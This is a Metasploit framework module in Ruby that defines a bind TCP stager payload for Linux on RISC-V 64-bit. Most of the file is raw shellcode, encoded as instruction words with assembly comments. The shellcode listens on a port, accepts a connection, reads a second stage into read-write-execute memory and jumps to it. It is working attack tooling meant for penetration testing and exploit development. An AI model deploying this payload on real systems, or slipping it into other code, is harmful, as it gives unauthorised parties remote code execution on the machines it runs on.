# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 244

  include Msf::Payload::Linux::Riscv64le::Prepends
  include Msf::Payload::Stager

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Bind TCP Stager',
        'Description' => 'Listen for a connection',
        'Author' => ['bcoles'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV64LE,
        'Handler' => Msf::Handler::BindTcp,
        'Stager' => {
          'Offsets' =>
                  {
                    'LPORT' => [ 242, 'n' ]
                  },
          'Payload' => stager_payload
        }
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    print_status("Transmitting stage length value (#{payload.length} bytes) ...")
    conn.put([payload.length].pack('V'))
    true
  end

  private

  def stager_payload
    [
      # socket(AF_INET, SOCK_STREAM, 0)
      0x00200513,          # li    a0, 2             # AF_INET
      0x00100593,          # li    a1, 1             # SOCK_STREAM
      0x00000613,          # li    a2, 0             # IPPROTO_IP
      0x0c600893,          # li    a7, 198           # SYS_socket
      0x00000073,          # ecall
      0x00050493,          # mv    s1, a0            # save listen fd in s1

      # bind(s1, &sockaddr, 16)
      0x00048513,          # mv    a0, s1            # fd
      0x01000613,          # li    a2, 16            # addrlen
      0x0c800893,          # li    a7, 200           # SYS_bind
      0xff010113,          # addi  sp, sp, -16       # allocate stack
      0x00013023,          # sd    zero, 0(sp)       # clear stack (INADDR_ANY)
      0x00013423,          # sd    zero, 8(sp)       # clear stack
      0x00000297,          # auipc t0, 0             # t0 = PC
      0x0c028293,          # addi  t0, t0, 192       # t0 = &sockaddr (end of payload)
      0x0002a303,          # lw    t1, 0(t0)         # load family+port word
      0x00612023,          # sw    t1, 0(sp)         # store family+port at sp
      0x00010593,          # mv    a1, sp            # a1 = &sockaddr on stack
      0x00000073,          # ecall

      # listen(s1, 1)
      0x00048513,          # mv    a0, s1            # fd
      0x00100593,          # li    a1, 1             # backlog
      0x0c900893,          # li    a7, 201           # SYS_listen
      0x00000073,          # ecall

      # accept(s1, NULL, NULL)
      0x00048513,          # mv    a0, s1            # fd
      0x00000593,          # li    a1, 0             # addr = NULL
      0x00000613,          # li    a2, 0             # addrlen = NULL
      0x0ca00893,          # li    a7, 202           # SYS_accept
      0x00000073,          # ecall
      0x00050493,          # mv    s1, a0            # save client fd in s1

      # read(s1, sp, 4) — read stage length
      0x00048513,          # mv    a0, s1            # fd
      0x00010593,          # mv    a1, sp            # buf = sp
      0x00400613,          # li    a2, 4             # count = 4
      0x03f00893,          # li    a7, 63            # SYS_read
      0x00000073,          # ecall

      # mmap(NULL, aligned_length, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
      0x00012e03,          # lw    t3, 0(sp)         # t3 = stage length
      0x00000513,          # li    a0, 0             # addr = NULL
      0x00ce5593,          # srli  a1, t3, 12        # a1 = length >> 12
      0x00158593,          # addi  a1, a1, 1         # round up to next page
      0x00c59593,          # slli  a1, a1, 12        # a1 = aligned length
      0x00700613,          # li    a2, 7             # PROT_READ|PROT_WRITE|PROT_EXEC
      0x02200693,          # li    a3, 34            # MAP_PRIVATE|MAP_ANONYMOUS
      0xfff00713,          # li    a4, -1            # fd = -1
      0x00000793,          # li    a5, 0             # offset = 0
      0x0de00893,          # li    a7, 222           # SYS_mmap
      0x00000073,          # ecall
      0x000e0e93,          # mv    t4, t3            # t4 = remaining bytes
      0x00050f13,          # mv    t5, a0            # t5 = mmap base (exec target)
      0x00050f93,          # mv    t6, a0            # t6 = write pointer

      # read_loop: read(s1, ptr, remaining)
      0x00048513,          # mv    a0, s1            # fd
      0x000f8593,          # mv    a1, t6            # buf = write pointer
      0x000e8613,          # mv    a2, t4            # count = remaining
      0x03f00893,          # li    a7, 63            # SYS_read
      0x00000073,          # ecall
      0x00a04863,          # bltz  a0, fail          # read error
      0x00af8fb3,          # add   t6, t6, a0        # advance pointer
      0x40ae8eb3,          # sub   t4, t4, a0        # decrement remaining
      0xfc0e98e3,          # bnez  t4, read_loop     # loop if more data

      # jump to stage — socket fd in s1
      0x000f0067, # jr    t5                # jump to mmap'd stage

      # fail: exit(0)
      0x00000513,          # li    a0, 0
      0x05d00893,          # li    a7, 93            # SYS_exit
      0x00000073,          # ecall

      # sockaddr_in (port patched by framework)
      0x5c110002, # .short 2 (AF_INET), .short 4444 (port, big-endian)
    ].pack('V*')
  end
end
